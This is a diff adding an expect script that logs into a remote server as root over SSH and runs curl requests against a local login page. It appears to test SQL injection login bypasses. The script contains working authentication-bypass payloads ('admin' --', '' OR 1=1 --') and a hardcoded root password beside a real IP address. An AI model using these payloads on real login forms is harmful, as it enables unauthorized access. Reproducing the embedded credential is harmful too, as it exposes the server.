@@ -1,0 +1,46 @@
+#!/usr/bin/expect -f
+
+set timeout 30
+set password {$$R00tbeer02}
+
+spawn ssh root@155.138.197.128
+
+expect {
+    "password:" {
+        send "$password\r"
+    }
+    "yes/no" {
+        send "yes\r"
+        expect "password:"
+        send "$password\r"
+    }
+}
+
+expect "# "
+
+send "echo 'Testing valid SQL injections:'\r"
+expect "# "
+
+# Test 1: admin' --
+send "curl -X POST http://localhost/logintest.php -d \"username=admin' -- &password=x\" 2>/dev/null | grep SUCCESS\r"
+expect "# "
+
+# Test 2: ' OR 1=1 --
+send "curl -X POST http://localhost/logintest.php -d \"username=' OR 1=1 -- &password=x\" 2>/dev/null | grep SUCCESS\r"
+expect "# "
+
+send "echo ''\r"
+send "echo 'Testing invalid injection (should show Login failed):'\r"
+expect "# "
+
+# Test invalid SQL that would cause error
+send "curl -X POST http://localhost/logintest.php -d \"username=admin'test&password=x\" 2>/dev/null | grep -o 'Login failed'\r"
+expect "# "
+
+send "echo 'All tests complete!'\r"
+expect "# "
+
+send "exit\r"
+expect eof
+
+puts "\nTests complete!"
